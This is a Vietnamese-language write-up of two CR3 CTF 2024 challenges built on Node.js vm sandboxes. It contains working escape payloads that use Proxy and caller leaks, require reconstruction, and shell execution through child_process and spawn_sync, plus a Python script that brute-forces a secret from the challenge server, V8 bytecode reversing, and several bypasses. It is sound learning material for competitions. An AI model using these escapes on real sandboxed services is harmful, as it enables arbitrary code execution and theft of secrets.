---
title: "CR3 CTF 2024"
description: "CR3 CTF 2024"
summary: "CR3 CTF 2024"
categories: ["Writeup"]
tags: ["Web", "Reverse"]
#externalUrl: ""
date: 2024-05-03
draft: false
authors:
  - Shin24
---

Tối hôm trước mình có làm vài bài bên CR3 CTF để warmup cho Hacktheon 2024 vào thứ 7, sau đây là writeup của mình cho 2 bài `jscripting` và `jscripting-revenge`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/3e7c5b74-9ef1-4a96-9e07-07dd01ac4fca)

## Jscripting
Có thể nói đây là một nodejs sandbox dùng worker thread để chạy external code, dùng một custom `require` function chỉ cho phép gọi đến một danh sách các module giới hạn, mục tiêu sẽ là exfiltrate được flag hay secret gì đó. Module `vm` của nodejs được chọn để chạy external code, tuy nhiên module này không được tạo ra với mục đích bảo mật, đây chỉ là module giúp lập trình viên run code trong một context khác để tránh xung đột và ảnh hưởng đến các object ở context chính. Để escape ra `vm` thì việc thường làm sẽ là tìm cách leak các object từ bên ngoài thông qua các callback hoặc proxy
```js
(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor('return 123'))();
         }
         return me[key];
  }
})
```
khi throw Exception thì attribute `stack` của exception sẽ được access, từ đó `get` của proxy sẽ được trigger và ta có thể leak được external object thông qua `arguments.callee.caller`. Ở đây thì `require` đã bị thay thế như bên trên đề cập, `globalThis.process` cũng bị set về null nhưng `globalThis.module` thì vẫn còn, ta có thể invoke tới `globalThis.module.constructor.createRequire` để tạo lại function `require`.
```javascript
1});(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor(' globalThis.module.constructor.createRequire("/etc/passwd")("child_process").execSync("ls")'))();
         }
         return me[key];
  }
})
```

Khi chạy payload trên ta nhận về một lỗi:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/97c034ab-ced2-4f3b-b09f-148bffbb333b)

Khi mình trace vào source code của nodejs thì như sau:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cc096d1d-0ed5-4aed-a8c3-507e4bccebe2)

Nhìn lại code của đề:

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/152a2cf5-01da-4d94-895c-b000753864fc)

Không rõ là vô tình hay cố ý nhưng việc set `process.env` thành null khiến cho ta không thể invoke `exec` của `child_process` được nữa. Một fact đó là `globalThis.process` thật ra là một module và được nodejs auto expose ra, ta có thể chủ động import lại module này bằng cách `require("process")`, ở đây ta có thể đơn giản là set `process.env = {}` để không gặp lỗi khi chạy `child_process` nữa, cách của mình thì lại lợi dụng `process.binding` để truy cập đến các low level API của nodejs, cụ thể là `spawn_sync` để RCE
```javascript
1});(() => { throw new Proxy({}, {
  get: function(me, key) {
         const cc = arguments.callee.caller;
         if (cc != null) {
                return (cc.constructor.constructor(' globalThis.module.constructor.createRequire("/etc/passwd")("process").binding("spawn_sync").spawn({file: "/bin/sh",args: ["/bin/sh","-c", "calc.exe" ], stdio: [ {type:"pipe",readable:true,writable:false}, {type:"pipe",readable:false,writable:true}, {type:"pipe",readable:false,writable:true} ]})'))();
         }
         return me[key];
  }
})
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/22a895ca-6fa1-4f10-95f2-a8264ce4c7d0)

Thực chất ta có thể exfiltrate biến `flag`, nhưng flag thật thì nằm ở `secret`, code để oracle attack biến `flag`:
```py
import requests
import string

data = "1});(() => { throw new Proxy({}, {\n  get: function(me, key) {\n\t const cc = arguments.callee.caller;\n\t if (cc != null) {\n\t\treturn (cc.constructor.constructor('if (Object.getOwnPropertyDescriptor(globalThis.storage, \"secret\").value[INDEX] == \"CHAR\") {return 200}else{return 404}'))();\n\t }\n\t return me[key];\n  }\n})"
charset = string.printable
flag = "cr3{"
for i in range(4 ,100):
    for c in charset:
        payload = data.replace("INDEX", str(i)).replace("CHAR", c)
        try:
            r = requests.post("https://jscripting.1337.sb/api/execute", json={
                "script": payload
            })
            print(c)
            if "OK" in r.text:
                flag += c
                print("===>" + flag)
                if c == "}":
                    exit()
                break
        except:
            pass
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e8c7725e-a07c-4d66-9360-3f1927392741)

## Jscripting-revenge 

Vì có `revenge` trong tên nên hẳn là context bài này giống bài cũ, nhưng patch lại một cái gì đó. Ta thấy lần này có một file `utils.jsc` được ship cùng và một file `bytecode.js` dùng để run file file jsc kia

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6efbbcc6-0220-466d-99b4-ae3fbc6abefd)

Dùng tính năng prettier của chrome để beautify lại cái js cho tiện

```javascript
const vm = require('vm');
function generateScript(a, b) {
    fixBytecode(a);
    const c = readSourceHash(a);
    let d = "";
    1 < c && (d = "\"" + "\u200B".repeat(c - 2) + "\"");
    const e = new vm.Script(d,{
        cachedData: a,
        filename: b
    });
    if (e.cachedDataRejected)
        throw new Error("Invalid or incompatible cached data (cachedDataRejected)");
    return e
}
const readSourceHash = function(a) {
    if (!Buffer.isBuffer(a))
        throw new Error("bytecodeBuffer must be a buffer object.");
    return process.version.startsWith("v8.8") || process.version.startsWith("v8.9") ? a.subarray(12, 16).reduce((a,b,c)=>a += b * Math.pow(256, c), 0) : a.subarray(8, 12).reduce((a,b,c)=>a += b * Math.pow(256, c), 0)
}
  , compileCode = function(a, b) {
    if ("string" != typeof a)
        throw new Error(`javascriptCode must be string. ${typeof a} was given.`);
    const c = new vm.Script(a,{
        produceCachedData: !0
    });
    let d = c.createCachedData && c.createCachedData.call ? c.createCachedData() : c.cachedData;
    return b && (d = brotliCompressSync(d)),
    d
}
  , fixBytecode = function(a) {
    if (!Buffer.isBuffer(a))
        throw new Error("bytecodeBuffer must be a buffer object.");
    const b = compileCode("\"\u0CA0_\u0CA0\"")
      , c = parseFloat(process.version.slice(1, 5));
    process.version.startsWith("v8.8") || process.version.startsWith("v8.9") ? (b.subarray(16, 20).copy(a, 16),
    b.subarray(20, 24).copy(a, 20)) : 12 <= c && 21 >= c ? b.subarray(12, 16).copy(a, 12) : (b.subarray(12, 16).copy(a, 12),
    b.subarray(16, 20).copy(a, 16))
}
  , runBytecode = function(a) {
    if (!Buffer.isBuffer(a))
        throw new Error("bytecodeBuffer must be a buffer object.");
    const b = generateScript(a);
    return b.runInThisContext()
}
  , runBytecodeFile = function(a) {
    if ("string" != typeof a)
        throw new Error(`filename must be a string. ${typeof a} was given.`);
    const b = require('fs').readFileSync(a);
    return runBytecode(b)
};
module.exports = {
    runBytecodeFile
};
```

Vậy file này dùng `vm` để run compiled bytecode, vậy mình nghĩ ta cần biết được thực sự file kia chạy gì, mình qua một file test để run standalone cái `utils.jsc`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5fbf6d69-a112-4aaa-89af-6ac91762ceec)

Bị lỗi, nhìn lại vào source `worker.js` ta thấy `runBytecodeFile("./utils.jsc")` trả về một anonymous function, trước khi invoke function này thì có một dòng `globalThis.require = require;`, ta thử thêm dòng này vào vì khả năng function mà lỗi đang nhắc đến là `globalThis.require`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/91e8f86c-5f1c-48d7-aaf7-7e537c25c99d)

Lỗi khác được trả về, tới đây thì stuck một lúc, mình suy đoán là có thể nó đang thao tác gì đó với `globalThis.storage` nên mình thử thêm vào

```javascript
const { runBytecodeFile } = require("./bytecode.js")

globalThis.require = require;

secret = "SECRET"
flag = "FLAG"

globalThis.storage = new Proxy({ secret },
    {
        get: (target, name) => {
            if (name === "secret") {
                return null;
            }
    
            return target[name];
        },
    
        getOwnPropertyDescriptor: (target, name) => {
            if (name === "secret") {
                return {
                    value: flag,
                    writable: true,
                    enumerable: true,
                    configurable: true,
                };
            }
    
            return target[name];
        }
    });

runBytecodeFile("./utils.jsc")();
```

Lần này lỗi không throw ra nữa, nhưng vấn đề là làm sao để ta biết được cụ thể thì `utils.js` đang làm gì?

### Reversing V8 bytecode
Tới đây mình quyết định trace các function call của V8
```
node --trace test.js
```

Vì khi trace như vầy thì nó sẽ in ra tất cả function call của nodejs internal, ta có thể narrow down bằng cách tìm đến đoạn bắt đầu load `utils.js` vì sau đó chắc chắn là các function call của `utils.jsc`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5c571f1d-1e71-40d2-824a-a85e412684c2)

Chắc là cỡ đoạn này, tiếp tục trace xuống ta thấy nó import module `util`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7a53c379-1adc-4568-8bc0-c7ac5052628e)

Tìm thấy đoạn nó thao tác với symbol `nodejs.util.inspect.custom`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/716f16f6-da33-40a5-949b-7801e0c485f5)

Chưa có thông tin gì nhiều lắm, nhưng với 2 dữ kiện là import `util` và truy cập vào symbol `nodejs.util.inspect.custom` thì có thể `globalThis.storage` đang chứa gì đó, tới đây mình quyết định debug v8 của nodejs

```javascript
const { runBytecodeFile } = require("./bytecode.js")

globalThis.require = require;

secret = "SECRET"
flag = "FLAG"

globalThis.storage = new Proxy({ secret },
    {
        get: (target, name) => {
            if (name === "secret") {
                return null;
            }
    
            return target[name];
        },
    
        getOwnPropertyDescriptor: (target, name) => {
            if (name === "secret") {
                return {
                    value: flag,
                    writable: true,
                    enumerable: true,
                    configurable: true,
                };
            }
    
            return target[name];
        }
    });

runBytecodeFile("./utils.jsc")();

%DebugPrint(globalThis.storage);
%SystemBreak();
```

```
gdb node
pwndbg> r --allow-natives-syntax test.js
```

Ta dùng option --allow-natives-syntax thì v8 sẽ expose ra một số API phục vụ cho debug, `%DebugPrint` sẽ in các thông tin về memory của một object, `%SystemBreak` sẽ dùng để set breakpoint. Mình sẽ dùng gdb script của v8 để tiện cho debug: https://chromium.googlesource.com/v8/v8/+/refs/heads/main/tools/gdbinit

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/74764246-1660-4478-8d36-a508cae8505c)

```
target: 0x17067d4aec29
```

Đây là `global.storage`, ta sẽ inspect nó bằng lên `job` của v8 gdb script

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/edf3feb7-3005-47a7-8fa2-e85ec751f3e9)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/484d8707-772a-4409-803a-be922b7d9275)

Tìm thấy symbol đó rồi, giờ ta sẽ inspect byte codes của nó

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/805f8149-15be-4c13-be87-4e6ddc76a4ab)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/91b339e7-e26d-4040-8a70-c70c7c4ef4d6)

Đây là các constant của nó, v8 bytecode chỉ thao tác với các constant, register gồm thanh ghi accumulator và các thanh ghi r0, r1, ... 

Để tìm hiểu cách các opcode hoạt động thì mình đi vào source V8

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/912ce82a-5604-4d58-a4ad-c02b98ba36db)

Cứ search through source và mình tìm được handler của opcode, lấy ví dụ của `TestReferenceEqual`, đầu tiên nó sẽ lấy trá trị từ register tại arg 1, so sánh với accumulator register, lưu kết quả vào accumulator register. Ngay sau `TestReferenceEqual` là `JumpIfTrue`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/606738f3-e1e8-4209-9d1e-71944e2af705)

Tại đây sẽ check kết quả từ accumulator register để quyết định có jump hay không, cứ thế ta sẽ reverse dần để tìm ra flow đúng.

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/bf475f42-1f6b-48ae-87b8-96941d0d6e53)

Đoạn này sẽ load `depth` vào, truyền vào `parseInt` và kết quả trả về lưu vào trong r0  

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4b48eb63-9b3e-4e31-b958-45f198e4a589)

Sau đó sẽ tiếp tục so sánh xem có lớn hơn `3` không

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2bb2743a-9074-4f2c-a558-15e8fb0c6682)

Nếu đúng thì sẽ load constant 2 là `Error: Too deep` và return 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9c33b1ca-5fe8-4869-ba39-f54afa29ca99)

Để kiểm chứng thì ta có thể chạy thử

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f657111b-cf26-4ba5-927c-f00922cafc53)

Nếu sai thì jump đến `+28`, tại đây như ban đầu ta biết `a1` là depth, vậy là lúc nãy truyền vào `parseInt` để check thôi chứ depth không bị thay đổi, tiếp tục lưu `depth` vào `r0` bằng lệnh `Star0` và so sánh với `Infinity`, nếu không bằng thì sẽ nhảy đến `+46`, tại `+46` sẽ load constant `haha nice try!` và return

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/10c13d29-5cc5-45a7-b29d-35573ac69e19)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9175f2bb-6565-4827-bfc8-76f4bd62f596)

Vậy có vẻ nhánh ta cần vào là lúc `depth` == `Infinity`, cùng thử xem sao

```javascript
const { runBytecodeFile } = require("./bytecode.js")

globalThis.require = require;

secret = "SECRET"
flag = "FLAG"

globalThis.storage = new Proxy({ secret },
    {
        get: (target, name) => {
            if (name === "secret") {
                return null;
            }
    
            return target[name];
        },
    
        getOwnPropertyDescriptor: (target, name) => {
            if (name === "secret") {
                return {
                    value: flag,
                    writable: true,
                    enumerable: true,
                    configurable: true,
                };
            }
    
            return target[name];
        }
    });

runBytecodeFile("./utils.jsc")();


// %DebugPrint(globalThis.storage);
// %SystemBreak();

const util = require("util");

console.log(util.inspect(globalThis.storage, { compact: false, depth: Infinity, breakLength: 0 }))


```

```
{
  '👺': {
    '👺': {
      '👺': {
        '👺': {
          '👺': {
            '👺': {
              '👺': {
                '👺': {
                  '👺': {
                    '👺': {
                      '👺': {
                        '👺': {
                          '👺': {
                            '👺': {
                                '👺': [Object: Inspection interrupted prematurely. Maximum call stack size exceeded.]
...
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7d7a9455-5ca1-4845-a54f-edf8b82a46f7)

Hình như depth bị lớn quá, thử trên server xem, giờ ta sẽ phải import `util` vào 

```
<ref *1> Object [global] {
  global: [Circular *1],
  clearImmediate: [Function: clearImmediate],
  setImmediate: [Function: setImmediate] {
    [Symbol(nodejs.util.promisify.custom)]: [Getter]
  },
  clearInterval: [Function: clearInterval],
  clearTimeout: [Function: clearTimeout],
  setInterval: [Function: setInterval],
  setTimeout: [Function: setTimeout] {
    [Symbol(nodejs.util.promisify.custom)]: [Getter]
  },
  queueMicrotask: [Function: queueMicrotask],
  structuredClone: [Getter/Setter],
  atob: [Getter/Setter],
  btoa: [Getter/Setter],
  performance: [Getter/Setter],
  fetch: [AsyncFunction: fetch],
  crypto: [Getter],
  storage: {
    '👺': {
      '👺': {
        '👺': {
          '👺': {
...
secureRequire: [Function: secureRequire]
```

Ta thấy được function `secureRequire`, thử dùng `%DebugPrint` để xem bytecode của `secureRequire` như cách vừa nãy thử

```
0xd73e1e351a1: [BytecodeArray] in OldSpace
 - map: 0x13cd552c0fd1 <Map(BYTECODE_ARRAY_TYPE)>
Parameter count 2
Register count 14
Frame size 112
Bytecode age: 0
 9774 S> 0xd73e1e351d6 @    0 : 79 00 00 25       CreateArrayLiteral [0], [0], #37
         0xd73e1e351da @    4 : c4                Star0
10013 S> 0xd73e1e351db @    5 : 12                LdaFalse
         0xd73e1e351dc @    6 : c3                Star1
10048 S> 0xd73e1e351dd @    7 : b1 fa 01 03       GetIterator r0, [1], [3]
         0xd73e1e351e1 @   11 : be                Star6
         0xd73e1e351e2 @   12 : 2d f4 01 05       GetNamedProperty r6, [1], [5]
         0xd73e1e351e6 @   16 : bf                Star5
         0xd73e1e351e7 @   17 : 12                LdaFalse
         0xd73e1e351e8 @   18 : bd                Star7
         0xd73e1e351e9 @   19 : 19 ff f0          Mov <context>, r10
         0xd73e1e351ec @   22 : 11                LdaTrue
         0xd73e1e351ed @   23 : bd                Star7
10040 S> 0xd73e1e351ee @   24 : 5d f5 f4 07       CallProperty0 r5, r6, [7]
         0xd73e1e351f2 @   28 : b9                Star11
         0xd73e1e351f3 @   29 : 9f 07             JumpIfJSReceiver [7] (0xd73e1e351fa @ 36)
         0xd73e1e351f5 @   31 : 65 c6 00 ef 01    CallRuntime [ThrowIteratorResultNotAnObject], r11-r11
         0xd73e1e351fa @   36 : 2d ef 02 09       GetNamedProperty r11, [2], [9]
         0xd73e1e351fe @   40 : 96 25             JumpIfToBooleanTrue [37] (0xd73e1e35223 @ 77)
         0xd73e1e35200 @   42 : 2d ef 03 0b       GetNamedProperty r11, [3], [11]
         0xd73e1e35204 @   46 : b9                Star11
         0xd73e1e35205 @   47 : 12                LdaFalse
         0xd73e1e35206 @   48 : bd                Star7
         0xd73e1e35207 @   49 : 19 ef f8          Mov r11, r2
10040 S> 0xd73e1e3520a @   52 : 19 f8 f6          Mov r2, r4
10074 S> 0xd73e1e3520d @   55 : 0b f8             Ldar r2
10081 E> 0xd73e1e3520f @   57 : 6b 03 0d          TestEqual a0, [13]
         0xd73e1e35212 @   60 : 98 09             JumpIfTrue [9] (0xd73e1e3521b @ 69)
         0xd73e1e35214 @   62 : 13 04             LdaConstant [4]
10095 E> 0xd73e1e35216 @   64 : 6b 03 0e          TestEqual a0, [14]
         0xd73e1e35219 @   67 : 99 06             JumpIfFalse [6] (0xd73e1e3521f @ 73)
10125 S> 0xd73e1e3521b @   69 : 11                LdaTrue
         0xd73e1e3521c @   70 : c3                Star1
10156 S> 0xd73e1e3521d @   71 : 8a 06             Jump [6] (0xd73e1e35223 @ 77)
10031 E> 0xd73e1e3521f @   73 : 89 33 00 0f       JumpLoop [51], [0], [15] (0xd73e1e351ec @ 22)
         0xd73e1e35223 @   77 : 0d ff             LdaSmi [-1]
         0xd73e1e35225 @   79 : bb                Star9
         0xd73e1e35226 @   80 : bc                Star8
         0xd73e1e35227 @   81 : 8a 05             Jump [5] (0xd73e1e3522c @ 86)
         0xd73e1e35229 @   83 : bb                Star9
         0xd73e1e3522a @   84 : 0c                LdaZero
         0xd73e1e3522b @   85 : bc                Star8
         0xd73e1e3522c @   86 : 10                LdaTheHole
         0xd73e1e3522d @   87 : a6                SetPendingMessage
         0xd73e1e3522e @   88 : ba                Star10
         0xd73e1e3522f @   89 : 0b f3             Ldar r7
         0xd73e1e35231 @   91 : 96 23             JumpIfToBooleanTrue [35] (0xd73e1e35254 @ 126)
         0xd73e1e35233 @   93 : 19 ff ef          Mov <context>, r11
         0xd73e1e35236 @   96 : 2d f4 05 10       GetNamedProperty r6, [5], [16]
         0xd73e1e3523a @  100 : 9e 1a             JumpIfUndefinedOrNull [26] (0xd73e1e35254 @ 126)
         0xd73e1e3523c @  102 : b8                Star12
         0xd73e1e3523d @  103 : 5d ee f4 12       CallProperty0 r12, r6, [18]
         0xd73e1e35241 @  107 : 9f 13             JumpIfJSReceiver [19] (0xd73e1e35254 @ 126)
         0xd73e1e35243 @  109 : b7                Star13
         0xd73e1e35244 @  110 : 65 c6 00 ed 01    CallRuntime [ThrowIteratorResultNotAnObject], r13-r13
         0xd73e1e35249 @  115 : 8a 0b             Jump [11] (0xd73e1e35254 @ 126)
         0xd73e1e3524b @  117 : b9                Star11
         0xd73e1e3524c @  118 : 0c                LdaZero
         0xd73e1e3524d @  119 : 1c f2             TestReferenceEqual r8
         0xd73e1e3524f @  121 : 98 05             JumpIfTrue [5] (0xd73e1e35254 @ 126)
         0xd73e1e35251 @  123 : 0b ef             Ldar r11
         0xd73e1e35253 @  125 : a8                ReThrow
         0xd73e1e35254 @  126 : 0b f0             Ldar r10
         0xd73e1e35256 @  128 : a6                SetPendingMessage
         0xd73e1e35257 @  129 : 0c                LdaZero
         0xd73e1e35258 @  130 : 1c f2             TestReferenceEqual r8
         0xd73e1e3525a @  132 : 99 05             JumpIfFalse [5] (0xd73e1e3525f @ 137)
         0xd73e1e3525c @  134 : 0b f1             Ldar r9
         0xd73e1e3525e @  136 : a8                ReThrow
10200 S> 0xd73e1e3525f @  137 : 0b f9             Ldar r1
         0xd73e1e35261 @  139 : 96 04             JumpIfToBooleanTrue [4] (0xd73e1e35265 @ 143)
10225 S> 0xd73e1e35263 @  141 : 0e                LdaUndefined
10232 S> 0xd73e1e35264 @  142 : a9                Return
10251 S> 0xd73e1e35265 @  143 : 2d 03 06 14       GetNamedProperty a0, [6], [20]
         0xd73e1e35269 @  147 : bf                Star5
         0xd73e1e3526a @  148 : 13 04             LdaConstant [4]
         0xd73e1e3526c @  150 : bd                Star7
10251 E> 0xd73e1e3526d @  151 : 5e f5 03 f3 16    CallProperty1 r5, a0, r7, [22]
         0xd73e1e35272 @  156 : 97 04             JumpIfToBooleanFalse [4] (0xd73e1e35276 @ 160)
10284 S> 0xd73e1e35274 @  158 : 0e                LdaUndefined
10291 S> 0xd73e1e35275 @  159 : a9                Return
10311 S> 0xd73e1e35276 @  160 : 17 06             LdaImmutableCurrentContextSlot [6]
         0xd73e1e35278 @  162 : aa 07             ThrowReferenceErrorIfHole [7]
         0xd73e1e3527a @  164 : bf                Star5
10318 E> 0xd73e1e3527b @  165 : 62 f5 03 18       CallUndefinedReceiver1 r5, a0, [24]
10335 S> 0xd73e1e3527f @  169 : a9                Return
Constant pool (size = 8)
0xd73e1e35281: [FixedArray] in OldSpace
 - map: 0x13cd552c0211 <Map(FIXED_ARRAY_TYPE)>
 - length: 8
           0: 0x0d73e1e352d1 <ArrayBoilerplateDescription PACKED_ELEMENTS, 0x0d73e1e352e9 <FixedArray[8]>>
           1: 0x13cd552c9211 <String[4]: #next>
           2: 0x13cd552c5f49 <String[4]: #done>
           3: 0x13cd552c4821 <String[5]: #value>
           4: 0x11a795fc2861 <String[4]: #util>
           5: 0x13cd552c70b9 <String[6]: #return>
           6: 0x11a795fd8471 <String[10]: #startsWith>
           7: 0x0d73e1e35149 <String[12]: #localRequire>
Handler Table (size = 32)
   from   to       hdlr (prediction,   data)
  (  22,  77)  ->    83 (prediction=0, data=10)
  (  96, 115)  ->   117 (prediction=0, data=11)
Source Position Table (size = 54)
0x0d73e1e35449 <ByteArray[54]>
```

Có 3 route lead đến return, ở `+160` sẽ là nơi ta cần đến vì 2 route còn lại đều là return về `undefined`, ta sẽ đi ngược từ đích về nguồn để tìm đường đến nhánh này

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/d384949a-d75b-41ea-8d3b-d6022b4a85c0)

Phần này sẽ check xem module đang require có phải là util không, nếu không thì nhảy đến `+160`, vậy là ta không được include `util` 

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/caf315ff-7cb8-4429-ad91-55eaa1b2c9d1)

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ed4445d4-752a-4e51-b86e-3af767006cb5)

Cách bypass của tác giả đó là override lại method `startsWith` luôn return false, để ý bảng constant ta sẽ thấy method `startsWith` được gọi để check nếu name của module bằng đầu bằng `util...`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/11a65428-364c-4149-8705-16f22f992788)

```javascript
(function(){return ({ toJSON: function() {k = arguments.callee.caller.constructor(`String.prototype.startsWith = () => false;return JSON.stringify([...globalThis.secureRequire(\"util\").inspect(globalThis.storage, {customInspect: true, depth: Infinity})])`)()}, toString: () => k })})()
```

Kết quả trả về đi qua JSON.stringify, method `toJSON` được gọi do đó ta có thể leak được external object thông qua `caller`

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/d28d1cac-19fe-4889-9c38-49022e4ba2c7)

Được rồi, nhưng mình chẳng thấy flag đâu cả...

Thử test lại ở local, nâng stack-size lên
```
node --stack-size=10000000 test.js
```

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e22e6dc9-dd05-4883-a999-7fb1475c011b)

Flag hiện ra rồi, vậy là do đệ quy quá nhiều lần exceeds default stack-size. Đến đây thì mình bí rồi, mình xem thử cách làm của author

```javascript
(()=>{const a=new Error;a.name={toString:new Proxy(()=>{},{apply(a,b,c){throw c.constructor.constructor("String.prototype.startsWith = (s, p) => { return false; };return [...secureRequire('util').inspect(globalThis.storage, {customInspect: true, depth: Infinity})]")()}})};try{a.stack}catch(a){return a}})();
```

Đầu tiên thì cứ phân tích payload này trước, đầu tiên gán một Proxy cho hàm `toString` của `Error.name`, khi `Error.name.toString` được gọi nó sẽ trigger method `apply` của proxy, khi gọi `a.stack` thì ở internal side của nodejs `prepareStackTrace` sẽ được gọi và gọi đến `Error.name.toString`, đây là để escape ra khỏi `vm`. Đoạn `throw (...)` sẽ được chạy, bằng cách handle exception ở bên ngoài thì ta có thể catch lại kết quả của câu lệnh vừa chạy và return nó về. Sau khi xem xong mình vẫn không hiểu vì sao cách của author được, hơi ảo nhưng có lẽ mình sẽ tìm hiểu và update sau

UPDATE: thật ra đây là vấn đề của thằng burpsuite cơ, payload mình oke =))) đm burpsuite, me go for postman

### Unintendeds
```javascript
(function(){return ({ toJSON: function() {k = arguments.callee.caller.constructor(`globalThis.storage.__defineGetter__('p', function(){ return this.secret });return btoa(globalThis.storage.p);`)()}, toString: () => k })})()
```

Vì getter sẽ được invoke sau khi Proxy handle xong, nếu thời điểm mà getter của `p` chạy thì `this.secret` lúc này sẽ không còn invoke `get` của Proxy nữa

![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7fb75684-b37b-4afd-ae41-f94c778d3543)

```javascript
new Proxy(_=>_ , {
    get: new Proxy(_=>_ , {
      apply: function(target, thisArg, argumentsList) {
          return argumentsList.constructor.constructor(`
            let leak;
            const stream = secureRequire('stream');
            const console = secureRequire('console');
            const out = stream.Writable({
                write(data) {
                    leak = data;
                }
            });
            const logger = new console.Console({ stdout: out });
            logger.dir(storage);
            return Array.from(leak).toString();
          `);
        }
    })
})

```

Cách này cũng khá hay, override method write và cho console.dir (console.dir sẽ không invoke `get` của Proxy, cũng như getter) lưu data vào một biến và trả về 
